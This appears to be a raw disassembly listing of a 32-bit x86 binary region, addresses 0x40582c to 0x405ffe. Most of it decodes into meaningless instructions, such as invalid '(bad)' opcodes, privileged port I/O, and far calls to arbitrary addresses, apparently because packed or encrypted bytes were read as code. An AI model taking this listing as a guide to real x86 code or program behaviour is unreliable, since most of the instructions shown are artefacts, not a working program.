  40582c:	and    dh,BYTE PTR [eax]
  40582e:	pop    esp
  40582f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405830:	(bad)  
  405831:	mov    esp,0x97e539f4
  405836:	lea    edx,[edx]
  405838:	or     edx,edx
  40583a:	cmp    DWORD PTR [ebp-0x1c071124],ebx
  405840:	popf   
  405841:	mov    bl,0xd8
  405843:	or     al,0xa3
  405845:	stos   DWORD PTR es:[edi],eax
  405846:	mov    ch,0x20
  405848:	cli    
  405849:	stos   DWORD PTR es:[edi],eax
  40584a:	jno    0x405804
  40584c:	sahf   
  40584d:	add    BYTE PTR [esi],bh
  40584f:	mov    BYTE PTR [edi+0x2f56754f],bh
  405855:	out    dx,al
  405856:	xchg   edx,eax
  405857:	pop    es
  405858:	add    dl,al
  40585a:	inc    esi
  40585b:	test   DWORD PTR [edx+0x29e2b693],edx
  405861:	fadd   DWORD PTR [ebp-0x2d]
  405864:	or     DWORD PTR [esi-0x154e344e],0x638b5279
  40586e:	pop    ebp
  40586f:	jmp    0x4d3460f5
  405874:	lock inc DWORD PTR [eax+0x7]
  405878:	ins    DWORD PTR es:[edi],dx
  405879:	(bad)
  40587d:	nop
  40587e:	loop   0x405879
  405880:	push   ss
  405881:	dec    BYTE PTR [eax]
  405883:	or     al,0xdd
  405885:	lods   eax,DWORD PTR ds:[esi]
  405886:	dec    ebx
  405887:	stc    
  405888:	repnz sahf 
  40588a:	shr    DWORD PTR [edx],0x24
  40588d:	enter  0xd66d,0x6b
  405891:	lds    ebx,FWORD PTR [ecx-0x682dc401]
  405897:	push   esp
  405898:	(bad)  
  40589a:	arpl   WORD PTR [edi],bp
  40589c:	and    al,0xf2
  40589e:	ins    BYTE PTR es:[edi],dx
  40589f:	int    0xec
  4058a1:	cmp    ecx,DWORD PTR [edi+edi*2-0x3b]
  4058a5:	cdq    
  4058a6:	call   0x107d:0x592625f1
  4058ad:	mov    ds:0xa498918c,al
  4058b2:	mov    ax,ds:0xaf1ec61a
  4058b8:	mov    bh,0x80
  4058ba:	fidiv  DWORD PTR [edi-0x5f]
  4058bd:	push   0x56
  4058bf:	pop    esp
  4058c0:	out    0x4c,eax
  4058c2:	cmp    eax,0x139c708
  4058c7:	and    eax,0xc5a386fb
  4058cc:	cmp    eax,edx
  4058ce:	dec    eax
  4058cf:	or     eax,0xe2df8ab1
  4058d4:	call   0xe1039c24
  4058d9:	add    edx,DWORD PTR [ecx+0x4eb504dc]
  4058df:	mov    dh,BYTE PTR [edx]
  4058e1:	call   0xac8a:0x5f07763c
  4058e8:	aam    0xca
  4058ea:	xchg   ebp,eax
  4058eb:	cmp    eax,0x87531b37
  4058f0:	sub    BYTE PTR [eax+ebp*2],ah
  4058f3:	bnd js 0x40588f
  4058f6:	mov    BYTE PTR [edi],ah
  4058f8:	mov    ebx,0x359ea196
  4058fd:	pop    esp
  4058fe:	call   0x65b0:0xfd753d22
  405905:	xor    DWORD PTR [esi],esp
  405907:	das    
  405908:	in     al,0xc
  40590a:	cmp    ah,ch
  40590c:	add    DWORD PTR [edi],ebx
  40590e:	or     ecx,DWORD PTR [edi-0x620d7f49]
  405914:	enter  0x86c9,0xa
  405918:	fisubr DWORD PTR [edx-0x12eb5b6b]
  40591e:	(bad)  
  40591f:	sbb    ch,al
  405921:	sahf   
  405922:	scas   eax,DWORD PTR es:[edi]
  405923:	cli    
  405924:	jo     0x405930
  405926:	lock ja 0x4059a6
  405929:	cld    
  40592a:	add    BYTE PTR [edi],ch
  40592c:	test   DWORD PTR [edx+0x3e],ebx
  40592f:	test   BYTE PTR [ecx+ebp*2+0x1a52e717],0x7a
  405937:	les    esp,FWORD PTR [edi-0x6]
  40593a:	arpl   bx,sp
  40593c:	mov    ds:0xbf668278,al
  405941:	(bad)  
  405942:	retf   
  405943:	rol    bh,0xd9
  405946:	jmp    0x405977
  405948:	fnstsw WORD PTR [esi+0x44b28081]
  40594e:	sbb    BYTE PTR [edx+0x9026b69],cl
  405954:	jb     0x4059cb
  405956:	mov    cs,WORD PTR [edx+0x31f7a98]
  40595c:	arpl   WORD PTR [ebp+0x24e62edb],si
  405962:	fimul  WORD PTR [esp+eax*1+0x74e38a33]
  405969:	js     0x405919
  40596b:	daa    
  40596c:	imul   esp,DWORD PTR [ebx],0xf92aac2c
  405972:	imul   esi,edx,0x245a87ab
  405978:	int    0x8c
  40597a:	mov    al,ah
  40597c:	inc    edx
  40597d:	dec    edi
  40597e:	fcomp  DWORD PTR [eax+0x37]
  405981:	and    ch,BYTE PTR [ecx-0x19]
  405984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405985:	fsubr  DWORD PTR ss:[edi+0x6a366d7c]
  40598c:	add    BYTE PTR [esp+ebp*2-0x60],dl
  405990:	pop    ebx
  405991:	adc    eax,0x1fdbbc22
  405996:	shl    BYTE PTR [eax+0x17],1
  405999:	loop   0x4059f7
  40599b:	in     eax,dx
  40599c:	adc    eax,0x9da2f3fc
  4059a1:	imul   edx,ebx,0x47dd806d
  4059a7:	call   0x9f7f:0x73479eb0
  4059ae:	mov    esp,0xcd3405b1
  4059b3:	loop   0x40599a
  4059b5:	inc    eax
  4059b6:	lods   eax,DWORD PTR ds:[esi]
  4059b7:	scas   eax,DWORD PTR es:[edi]
  4059b8:	mov    ds:0x4f6f735,al
  4059bd:	repnz and ebx,DWORD PTR gs:[esi+0x3f02eb6a]
  4059c5:	pop    ebx
  4059c6:	dec    ecx
  4059c7:	loope  0x4059d5
  4059c9:	stos   BYTE PTR es:[edi],al
  4059ca:	adc    DWORD PTR fs:[ebx-0x4b0cb6bc],edx
  4059d1:	jg     0x4059fa
  4059d3:	mov    cl,0x8a
  4059d5:	jno    0x4059e7
  4059d7:	daa    
  4059d8:	fsubr  QWORD PTR [eax-0x6d402bf1]
  4059de:	sbb    eax,0x9d82408a
  4059e3:	jmp    0x405977
  4059e5:	and    DWORD PTR [eax],esi
  4059e7:	ret    0xe1c4
  4059ea:	mov    ecx,0x3ba09355
  4059ef:	loope  0x405a54
  4059f1:	add    esi,DWORD PTR [ebp+0x10]
  4059f4:	cmp    edx,esi
  4059f6:	jbe    0x4050e3
  4059fc:	pop    ebx
  4059fd:	mov    eax,0xf89c8539
  405a02:	pop    edi
  405a03:	pop    esi
  405a04:	leave  
  405a05:	ret    0xc
  405a08:	push   ebp
  405a09:	mov    ebp,esp
  405a0b:	mov    eax,DWORD PTR [ebp+0xc]
  405a0e:	jmp    0x405cfe
  405a13:	cmp    eax,0xd4d7d0c1
  405a18:	fnstcw WORD PTR ds:0xbbc9f8d9
  405a1e:	jecxz  0x405a2e
  405a20:	or     al,0xd3
  405a22:	jmp    DWORD PTR [edi+0x38]
  405a25:	js     0x405a9f
  405a27:	dec    ebp
  405a28:	jle    0x405aa2
  405a2a:	js     0x4059ef
  405a2c:	jnp    0x4059c9
  405a2e:	fst    DWORD PTR [edi]
  405a30:	push   ss
  405a31:	fst    DWORD PTR [eax]
  405a33:	sub    bl,BYTE PTR [eax]
  405a35:	addr16 test al,0x92
  405a38:	cmp    dl,dh
  405a3a:	daa    
  405a3b:	push   ebp
  405a3c:	jne    0x4059fc
  405a3e:	mov    ds:0x94a74df6,eax
  405a43:	pop    esi
  405a44:	sub    al,0xf3
  405a46:	call   0x98af651c
  405a4b:	pop    ss
  405a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a4d:	or     al,0x53
  405a4f:	retf   
  405a50:	rcl    DWORD PTR [ecx+esi*4+0x101ae003],1
  405a57:	xor    al,ah
  405a59:	jmp    0x3d94:0x5b658d93
  405a60:	call   0xa5c5:0xcf1c5a7d
  405a67:	retf   
  405a68:	mov    dl,0xdb
  405a6a:	push   es
  405a6b:	push   edx
  405a6c:	or     eax,0xc90444db
  405a71:	jg     0x405a01
  405a73:	pop    esp
  405a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a75:	pushf  
  405a76:	pop    es
  405a77:	retf   
  405a78:	bound  ebp,QWORD PTR [esi+ebp*4-0x1e]
  405a7c:	pop    edx
  405a7d:	es fs retf 
  405a80:	mov    ecx,0x70894fd2
  405a85:	ins    BYTE PTR es:[edi],dx
  405a86:	add    edx,DWORD PTR [edx-0x227c63b]
  405a8c:	sar    edx,0x32
  405a8f:	adc    dl,BYTE PTR [eax]
  405a91:	out    0x70,eax
  405a93:	or     ebp,0x7a
  405a96:	inc    edx
  405a97:	add    bh,BYTE PTR [ecx-0x4eb6d514]
  405a9d:	add    eax,DWORD PTR [esi+0x5c88662]
  405aa3:	add    ebp,ecx
  405aa5:	adc    BYTE PTR [edx+0x4f],bl
  405aa8:	aad    0x5
  405aaa:	jle    0x405aa9
  405aac:	or     DWORD PTR [edi-0xe],esi
  405aaf:	pop    ss
  405ab0:	xchg   ebp,eax
  405ab1:	or     al,0xc
  405ab3:	mov    eax,ds:0x2b4a7e23
  405ab8:	push   ds
  405ab9:	adc    BYTE PTR [esi-0x3],cl
  405abc:	adc    al,0xac
  405abe:	dec    esi
  405abf:	adc    esp,DWORD PTR [ebx]
  405ac1:	fild   WORD PTR [ebx-0x17]
  405ac4:	cdq    
  405ac5:	cld    
  405ac6:	cmp    al,0x1f
  405ac8:	popa   
  405ac9:	shl    BYTE PTR [esi+0xf],1
  405acc:	xchg   ebp,eax
  405acd:	pop    ebx
  405ace:	js     0x405add
  405ad0:	mov    edx,ecx
  405ad2:	and    DWORD PTR [edi+0xe],ebx
  405ad5:	fmul   DWORD PTR [ebx+esi*4+0x137c3171]
  405adc:	hlt    
  405add:	and    BYTE PTR [esi-0x1bed8f08],0xba
  405ae4:	test   al,bh
  405ae6:	pop    edi
  405ae7:	outs   dx,BYTE PTR ds:[esi]
  405ae8:	xor    ebx,DWORD PTR [edi+0x3d]
  405aeb:	and    al,0x78
  405aed:	aam    0x62
  405aef:	fsubr  QWORD PTR [ebx]
  405af1:	dec    edx
  405af2:	rcr    BYTE PTR [ecx],1
  405af4:	jno    0x405b66
  405af6:	pop    ds
  405af7:	lea    esp,[edi+0x7aeff347]
  405afd:	mov    bh,0xd5
  405aff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b00:	dec    ecx
  405b01:	iret   
  405b02:	mov    esp,0x1f5ec068
  405b07:	jmp    0x39f9:0x55871dc5
  405b0e:	fprem1 
  405b10:	jmp    0x4a43ee5
  405b15:	or     BYTE PTR [ebx-0x3e],dh
  405b18:	jecxz  0x405b49
  405b1a:	(bad)  
  405b1c:	das    
  405b1d:	cmp    eax,0x53f66c0f
  405b22:	and    al,0xa2
  405b24:	xchg   ecx,eax
  405b25:	clc    
  405b26:	mov    ecx,0xc570f863
  405b2b:	rol    DWORD PTR [esi],1
  405b2d:	mov    bh,BYTE PTR [eax]
  405b2f:	jp     0x405ad2
  405b31:	xor    eax,0xb9d5e279
  405b36:	rol    BYTE PTR [ecx],cl
  405b38:	ins    DWORD PTR es:[edi],dx
  405b39:	jmp    0xe5e2dd07
  405b3e:	(bad)
  405b41:	scas   eax,DWORD PTR es:[edi]
  405b42:	push   0x1b
  405b44:	jo     0x405ba9
  405b46:	ds push ds
  405b48:	cmc    
  405b49:	and    eax,0x98b66a68
  405b4e:	outs   dx,BYTE PTR ds:[esi]
  405b4f:	inc    esi
  405b50:	pop    ss
  405b51:	xor    al,0x8d
  405b53:	mov    esi,0x905ac147
  405b58:	rol    BYTE PTR [ebp-0xaa0b66],0x2b
  405b5f:	std    
  405b60:	mov    esp,0x6736c407
  405b65:	test   eax,0xb3ec36ac
  405b6a:	sbb    eax,0xfd7dd4ef
  405b6f:	pop    ebp
  405b70:	das    
  405b71:	(bad)  
  405b72:	fimul  DWORD PTR [edx+0x28c797aa]
  405b78:	push   edi
  405b79:	xor    eax,0x320dee90
  405b7e:	ret    0xd326
  405b81:	dec    esi
  405b82:	jmp    0xc70da916
  405b87:	int3   
  405b88:	xor    edi,DWORD PTR [esi]
  405b8a:	inc    edi
  405b8b:	mov    esi,0xa5f05bf6
  405b90:	lds    ecx,FWORD PTR [edi]
  405b92:	aaa    
  405b93:	repnz push ebp
  405b95:	hlt    
  405b96:	test   BYTE PTR ds:0xfc55d9b4,cl
  405b9c:	cwde   
  405b9d:	or     al,0x20
  405b9f:	and    al,0xff
  405ba1:	pusha  
  405ba2:	xchg   ebp,eax
  405ba3:	ins    DWORD PTR es:[edi],dx
  405ba4:	jge    0x405b91
  405ba6:	mov    esp,0xbf1d8d88
  405bab:	arpl   WORD PTR [ebx],si
  405bad:	cli    
  405bae:	jp     0x405bc3
  405bb0:	mov    ds:0x88ab05cf,eax
  405bb5:	pop    edx
  405bb6:	add    edx,ecx
  405bb8:	imul   esi,DWORD PTR [esi+0x4c],0xffffffa1
  405bbc:	and    al,0x34
  405bbe:	xor    al,dl
  405bc0:	ds adc eax,0x3ce3123e
  405bc6:	ror    BYTE PTR [edi],1
  405bc8:	sub    eax,0x3bb0d70
  405bcd:	mov    ds:0x43570555,al
  405bd2:	fsubr  DWORD PTR [edx]
  405bd4:	fs cli 
  405bd6:	out    0xf,al
  405bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bd9:	scas   al,BYTE PTR es:[edi]
  405bda:	pop    esi
  405bdb:	(bad)  [eax]
  405bdd:	fistp  DWORD PTR [esi+0x55440984]
  405be3:	pop    eax
  405be4:	xor    DWORD PTR [eax-0x5a79ffcd],ecx
  405bea:	es inc ecx
  405bec:	sub    dh,0xf1
  405bef:	fs push ebp
  405bf1:	add    bl,bh
  405bf3:	aam    0xa9
  405bf5:	(bad)  
  405bf6:	es test dh,ch
  405bf9:	imul   esp,DWORD PTR [ebx],0xffffffca
  405bfc:	outs   dx,BYTE PTR ds:[esi]
  405bfd:	push   esp
  405bfe:	aas    
  405bff:	rol    DWORD PTR [edi-0x22],cl
  405c02:	cmp    esp,DWORD PTR ds:0x68b85802
  405c08:	sub    eax,0xd18674d4
  405c0d:	pop    ebp
  405c0e:	out    dx,eax
  405c0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c10:	adc    BYTE PTR [esi],0xd7
  405c13:	jae    0x405c7d
  405c15:	inc    edx
  405c16:	dec    esp
  405c17:	popa   
  405c18:	scas   al,BYTE PTR es:[edi]
  405c19:	test   ecx,edx
  405c1b:	call   0x7629:0x6dd2313a
  405c22:	and    edi,DWORD PTR [eax]
  405c24:	adc    al,0xee
  405c26:	mov    dh,ah
  405c28:	cwde   
  405c29:	sub    ebp,DWORD PTR [edi+0x1]
  405c2c:	push   edi
  405c2d:	pop    ecx
  405c2e:	cmp    BYTE PTR [edi+0x33a3ace2],ah
  405c34:	call   0x6e7:0x666b6f37
  405c3b:	xchg   esp,eax
  405c3c:	pop    edx
  405c3d:	test   eax,ecx
  405c3f:	push   ebx
  405c40:	loope  0x405ca1
  405c42:	add    al,0x23
  405c44:	loop   0x405c96
  405c46:	lahf   
  405c47:	add    BYTE PTR [ebx-0xab6e3b4],dh
  405c4d:	sub    al,0x93
  405c4f:	out    0x81,eax
  405c51:	arpl   WORD PTR [edx-0x365ab371],si
  405c57:	loop   0x405c2e
  405c59:	dec    esi
  405c5a:	sbb    al,0xfd
  405c5c:	in     al,0x5e
  405c5e:	iret   
  405c5f:	cwde   
  405c60:	aad    0xa4
  405c62:	and    DWORD PTR [eax],0x8834a804
  405c68:	aam    0x87
  405c6a:	les    ebp,FWORD PTR [edx-0x56]
  405c6d:	push   0xffffffe7
  405c6f:	loopne 0x405c86
  405c71:	inc    esp
  405c72:	das    
  405c73:	push   eax
  405c74:	jae    0x405c50
  405c76:	add    edi,DWORD PTR ds:0x37664377
  405c7c:	push   ebx
  405c7d:	call   0x6f74a4ca
  405c82:	in     al,0xf8
  405c84:	cmp    DWORD PTR [eax],esi
  405c86:	lods   al,BYTE PTR ds:[esi]
  405c87:	mov    al,ds:0x575ab506
  405c8c:	push   esp
  405c8d:	stc    
  405c8e:	aad    0x32
  405c90:	add    eax,DWORD PTR [esi-0x51a0108c]
  405c96:	test   BYTE PTR [eax-0x6d0d15d7],0x30
  405c9d:	jae    0x405c22
  405c9f:	(bad)  
  405ca0:	jnp    0x405cb5
  405ca2:	out    dx,al
  405ca3:	retf   
  405ca4:	jg     0x405c84
  405ca6:	inc    ebp
  405ca7:	in     eax,0x15
  405ca9:	xchg   ebx,eax
  405caa:	fiadd  WORD PTR [esi-0x6281e7d3]
  405cb0:	or     DWORD PTR [edx],0x8e1b5e0
  405cb6:	mov    DWORD PTR [eax],ecx
  405cb8:	(bad)  
  405cb9:	test   DWORD PTR [edx],0xfeb76687
  405cbf:	mov    BYTE PTR [edx],bl
  405cc1:	inc    dx
  405cc3:	icebp  
  405cc4:	push   ebx
  405cc5:	cmp    BYTE PTR [ebp+0x731c1da7],0xc
  405ccc:	jne    0x405cc7
  405cce:	call   0x397efebc
  405cd3:	jne    0x405d0a
  405cd5:	aas    
  405cd6:	test   eax,0xbdd26f92
  405cdb:	inc    dx
  405cdd:	out    dx,eax
  405cde:	mov    cl,0x44
  405ce0:	arpl   WORD PTR [ecx+0x6],bp
  405ce3:	push   esp
  405ce4:	mov    edi,0x52f8760d
  405ce9:	push   ds
  405cea:	dec    edi
  405ceb:	fmul   st(7),st
  405ced:	and    edx,DWORD PTR [edi]
  405cef:	test   DWORD PTR [edx-0x29d29af0],edx
  405cf5:	mov    ds:0xe5c37ddf,al
  405cfa:	fldcw  WORD PTR [eax]
  405cfc:	pusha  
  405cfd:	aam    0x33
  405cff:	shr    cl,cl
  405d01:	jmp    0x405d05
  405d03:	add    BYTE PTR [eax],al
  405d05:	rol    ebx,1
  405d07:	ror    cl,0xd6
  405d0a:	leave  
  405d0b:	rcr    ebx,1
  405d0d:	aaa    
  405d0e:	mov    eax,0x77044c09
  405d13:	pushf  
  405d14:	and    eax,0x78783db4
  405d19:	dec    ebp
  405d1a:	jle    0x405d94
  405d1c:	js     0x405ca5
  405d1e:	add    eax,0xa4d295ef
  405d23:	mov    ebp,DWORD PTR [eax+0x60113239]
  405d29:	test   eax,0xbe3a5b1
  405d2e:	dec    ebp
  405d2f:	retf   
  405d30:	xchg   edi,eax
  405d31:	sbb    DWORD PTR [ecx-0x7c],0x14133562
  405d38:	add    edi,DWORD PTR [eax]
  405d3a:	data16 repnz out dx,al
  405d3d:	hlt    
  405d3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d3f:	scas   eax,DWORD PTR es:[edi]
  405d40:	adc    eax,esp
  405d42:	ins    DWORD PTR es:[edi],dx
  405d43:	retf   
  405d44:	xchg   ebp,eax
  405d45:	cmp    DWORD PTR [ecx+edi*8+0x3c16e79d],edi
  405d4c:	test   al,0x65
  405d4e:	lar    edx,si
  405d51:	in     eax,dx
  405d52:	rol    DWORD PTR [eax+edx*1],1
  405d55:	sub    eax,0xf82c0517
  405d5a:	loop   0x405d07
  405d5c:	ins    DWORD PTR es:[edi],dx
  405d5d:	xchg   edx,eax
  405d5e:	adc    BYTE PTR [eax-0x3a],ah
  405d61:	inc    eax
  405d62:	lods   al,BYTE PTR ds:[esi]
  405d63:	sbb    DWORD PTR [eax],0xf73fa2e5
  405d69:	mov    ah,0x32
  405d6b:	push   ebp
  405d6c:	std    
  405d6d:	jne    0x405cf2
  405d6f:	inc    ebx
  405d70:	mov    ds:0x46b19fb1,eax
  405d75:	dec    ebx
  405d76:	mov    ebx,0x7cdbf1e1
  405d7b:	pop    eax
  405d7c:	sub    ch,BYTE PTR [edx]
  405d7e:	bts    DWORD PTR [ecx+0x1b6fbc62],esp
  405d85:	or     bl,BYTE PTR [ebx-0x1a7b6502]
  405d8b:	adc    BYTE PTR [edi],0xaf
  405d8e:	pop    edi
  405d8f:	mov    al,0x58
  405d91:	push   ss
  405d92:	jmp    0x405df7
  405d94:	xchg   edi,edx
  405d96:	add    cl,cl
  405d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d99:	test   al,0xde
  405d9b:	add    BYTE PTR [esi],bh
  405d9d:	and    ecx,DWORD PTR [eax]
  405d9f:	cmc    
  405da0:	stc    
  405da1:	xlat   BYTE PTR ds:[ebx]
  405da2:	fmul   st(6),st
  405da4:	add    ah,BYTE PTR [edx-0x1b233666]
  405daa:	cmc    
  405dab:	mov    ss,ebp
  405dad:	push   ebp
  405dae:	or     BYTE PTR [ecx+0x7],al
  405db1:	xlat   BYTE PTR ds:[ebx]
  405db2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405db3:	sbb    eax,0x81778a99
  405db8:	jmp    0x405dd2
  405dba:	mov    ch,BYTE PTR [edi-0x1c]
  405dbd:	push   edx
  405dbe:	js     0x405e0d
  405dc0:	dec    esi
  405dc1:	xor    BYTE PTR [edi-0x5fffce51],bh
  405dc7:	hlt    
  405dc8:	in     al,dx
  405dc9:	push   edx
  405dca:	jge    0x405e44
  405dcc:	mov    bl,ch
  405dce:	xor    al,0x52
  405dd0:	cli    
  405dd1:	(bad)  
  405dd2:	fs cld 
  405dd4:	ret    
  405dd5:	and    al,0xde
  405dd7:	push   esi
  405dd8:	pop    ebp
  405dd9:	addr16 push ss
  405ddb:	or     bh,dh
  405ddd:	shl    BYTE PTR [ecx],cl
  405ddf:	push   0xc2a08073
  405de4:	jge    0x405d8d
  405de6:	fs push 0x1bcdf3db
  405dec:	pop    eax
  405ded:	add    DWORD PTR [eax],ebp
  405def:	(bad)
  405df3:	idiv   eax
  405df5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405df6:	fcom   DWORD PTR [ebp+0x2e]
  405df9:	leave  
  405dfa:	jge    0x405d7f
  405dfc:	mov    ecx,0xea622804
  405e01:	mov    esp,0x299f0d2b
  405e06:	dec    edi
  405e07:	retf   
  405e08:	mov    bl,BYTE PTR [ecx-0x63]
  405e0b:	imul   eax,DWORD PTR cs:[ebx+0x3b],0xc1491e2c
  405e13:	test   BYTE PTR [ebx],dl
  405e15:	adc    eax,0xcd5cf09c
  405e1a:	push   DWORD PTR [ebx+0x36]
  405e1d:	xchg   esp,eax
  405e1e:	scas   al,BYTE PTR es:[edi]
  405e1f:	jecxz  0x405dc5
  405e21:	leave  
  405e22:	ret    0x3922
  405e25:	inc    ebx
  405e26:	ret    0xc111
  405e29:	dec    ebx
  405e2a:	and    ah,BYTE PTR [ebx+0x3b]
  405e2d:	xchg   edx,eax
  405e2e:	mov    edx,0xd4ac3446
  405e33:	jge    0x405e29
  405e35:	(bad)  
  405e36:	fs aaa 
  405e38:	mov    WORD PTR [edx+0x75f3e5fc],gs
  405e3e:	lea    esp,[eax-0x49898e38]
  405e44:	sbb    dl,BYTE PTR [ecx+0x2ee1cae3]
  405e4a:	jno    0x405df6
  405e4c:	pop    ecx
  405e4d:	or     BYTE PTR [ecx-0x59f535e2],al
  405e53:	dec    ecx
  405e54:	cli    
  405e55:	repnz mov ah,0x6b
  405e58:	dec    esi
  405e59:	add    eax,0x49f75ece
  405e5e:	out    0x22,eax
  405e60:	adc    BYTE PTR ds:0x88e21f9d,0x30
  405e67:	jp     0x405e44
  405e69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e6a:	or     ecx,esp
  405e6c:	push   es
  405e6d:	aas    
  405e6e:	mov    edi,0x5fbce12e
  405e73:	mov    ds:0x6be16816,al
  405e78:	mov    eax,DWORD PTR [edi+ebx*1]
  405e7b:	xor    ecx,DWORD PTR [eax+ecx*2]
  405e7e:	sbb    al,0x22
  405e80:	or     BYTE PTR [ecx+0x5b],0x2b
  405e84:	dec    edx
  405e85:	lock or al,0x9a
  405e88:	jns    0x405e50
  405e8a:	nop
  405e8b:	clc    
  405e8c:	inc    ebp
  405e8d:	inc    esi
  405e8e:	add    eax,0x81fe56ed
  405e93:	rol    DWORD PTR [esp+eax*2],cl
  405e96:	push   ebp
  405e97:	fwait
  405e98:	jg     0x405e23
  405e9a:	add    esp,edi
  405e9c:	iret   
  405e9d:	add    ch,BYTE PTR [eax]
  405e9f:	test   eax,0xaf71ed15
  405ea4:	mov    bh,0x98
  405ea6:	xor    ah,0x62
  405ea9:	lods   eax,DWORD PTR ds:[esi]
  405eaa:	int    0x7c
  405eac:	mov    ah,0x3a
  405eae:	push   edx
  405eaf:	cmc    
  405eb0:	adc    DWORD PTR [eax],esi
  405eb2:	pop    ebp
  405eb3:	or     BYTE PTR [esi+0x28],bl
  405eb6:	fnstenv [eax]
  405eb8:	scas   al,BYTE PTR es:[edi]
  405eb9:	mov    ah,0x24
  405ebb:	dec    ebp
  405ebc:	imul   ebp,DWORD PTR [edi],0x2d
  405ebf:	pop    eax
  405ec0:	fincstp 
  405ec2:	popf   
  405ec3:	mov    cl,0x4f
  405ec5:	imul   ebx,DWORD PTR [edx-0x4bfa528f],0x288a8d58
  405ecf:	pop    ebx
  405ed0:	jmp    DWORD PTR [eax+0x15]
  405ed3:	jmp    0x405f05
  405ed5:	and    ch,al
  405ed7:	xor    DWORD PTR [eax+0x4f],eax
  405eda:	mov    esp,0xd52aa5e2
  405edf:	and    ebx,DWORD PTR [edx+0x3c]
  405ee2:	dec    edx
  405ee3:	das    
  405ee4:	(bad)  
  405ee5:	mov    dl,0x6f
  405ee7:	mov    al,ds:0xa5be4ef8
  405eec:	loope  0x405f2c
  405eee:	ret    
  405eef:	add    DWORD PTR [ebp-0x75],ecx
  405ef2:	and    ecx,DWORD PTR [edi+0x66]
  405ef5:	(bad)  
  405ef6:	jl     0x405e8b
  405ef8:	dec    ebp
  405ef9:	loopne 0x405edb
  405efb:	inc    esi
  405efc:	jle    0x405e91
  405efe:	pop    esi
  405eff:	xchg   esp,eax
  405f00:	jmp    0xfc4f2d7d
  405f05:	lea    edx,[eax]
  405f07:	fwait
  405f08:	bound  ecx,QWORD PTR [eax]
  405f0a:	push   ebp
  405f0b:	and    edi,DWORD PTR [ebp-0x708f8123]
  405f11:	lods   eax,DWORD PTR ds:[esi]
  405f12:	push   0xffffffea
  405f14:	lods   al,BYTE PTR fs:[esi]
  405f16:	ror    BYTE PTR [ecx+0x3],0x37
  405f1a:	push   ebp
  405f1b:	fcmovne st,st(2)
  405f1d:	in     eax,0xcd
  405f1f:	xor    eax,0x1853e0e3
  405f24:	mov    dl,0xc6
  405f26:	mul    DWORD PTR [ecx]
  405f28:	dec    edx
  405f29:	lea    edx,ss:[esi+0x6692206e]
  405f30:	daa    
  405f31:	aas    
  405f32:	fistp  WORD PTR [edi-0x2fbeb2ff]
  405f38:	leave  
  405f39:	(bad)  
  405f3a:	sub    esi,ebx
  405f3c:	inc    esp
  405f3d:	into   
  405f3e:	inc    edx
  405f3f:	push   ebp
  405f40:	fbstp  TBYTE PTR ds:0xf98ebd54
  405f46:	pop    esi
  405f47:	or     DWORD PTR [ecx+ebp*2],edx
  405f4a:	pop    eax
  405f4b:	or     dh,cl
  405f4d:	sbb    al,0x6e
  405f4f:	mov    bh,0x61
  405f51:	and    dh,BYTE PTR [ebp-0x30]
  405f54:	xchg   edi,eax
  405f55:	xchg   ebp,eax
  405f56:	jp     0x405fc5
  405f58:	dec    esp
  405f59:	iret   
  405f5a:	bound  edi,QWORD PTR [ecx]
  405f5c:	xchg   ebp,eax
  405f5d:	stc    
  405f5e:	xchg   BYTE PTR [ebx+0x6c],al
  405f61:	mov    esp,0x3974a14
  405f66:	push   cs
  405f67:	adc    esi,esp
  405f69:	cmp    BYTE PTR [ecx+0x38],dh
  405f6c:	shl    DWORD PTR [edi-0x176891bd],0x12
  405f73:	xor    dl,BYTE PTR [ebx-0x4fbfcebe]
  405f79:	loope  0x405f5d
  405f7b:	mov    edi,0xc981f315
  405f80:	mov    cl,0x6b
  405f82:	add    dh,BYTE PTR [edx+0x75dae4e1]
  405f88:	fxch   st(2)
  405f8a:	mov    bl,0x6c
  405f8c:	push   esi
  405f8d:	pushf  
  405f8e:	dec    edx
  405f8f:	nop
  405f90:	jno    0x405f57
  405f92:	xor    esp,DWORD PTR [ecx+0x35]
  405f95:	stos   DWORD PTR es:[edi],eax
  405f96:	pop    es
  405f97:	inc    ebp
  405f98:	inc    esi
  405f99:	sub    eax,0xeaf4005f
  405f9e:	cmc    
  405f9f:	imul   edx,edi,0x6b
  405fa2:	ss popf 
  405fa4:	dec    ebp
  405fa5:	out    dx,eax
  405fa6:	mov    cl,0x3f
  405fa8:	into   
  405fa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405faa:	iret   
  405fab:	mov    dh,BYTE PTR [esi+eax*4+0x11]
  405faf:	scas   eax,DWORD PTR es:[edi]
  405fb0:	cdq    
  405fb1:	dec    ebx
  405fb2:	shr    BYTE PTR [ecx-0x2714d398],1
  405fb8:	dec    esi
  405fb9:	add    eax,0x270a6a0f
  405fbe:	dec    ecx
  405fbf:	xchg   ecx,eax
  405fc0:	pop    es
  405fc1:	icebp  
  405fc2:	pop    ebx
  405fc3:	push   ss
  405fc4:	sbb    eax,0x22d8faaf
  405fc9:	ds out 0xe1,eax
  405fcc:	sbb    al,0xb4
  405fce:	mov    edi,0xbc9d8cd9
  405fd3:	stos   DWORD PTR es:[edi],eax
  405fd4:	in     al,0xbb
  405fd6:	mov    ecx,0xa7c8737c
  405fdb:	addr16 (bad) 
  405fdd:	mov    ebp,DWORD PTR [ebp-0x71]
  405fe0:	adc    al,0xc5
  405fe2:	rcl    BYTE PTR [ecx],0x12
  405fe5:	(bad)  
  405fe7:	fidivr WORD PTR [ecx]
  405fe9:	and    eax,0xcc641610
  405fee:	lods   al,BYTE PTR ds:[esi]
  405fef:	fnstcw WORD PTR [ecx+0x7264fd50]
  405ff5:	jmp    0x4062e5
  405ffa:	iret   
  405ffb:	rcl    ebx,cl
  405ffd:	retf   
  405ffe:	ror    ebx,cl
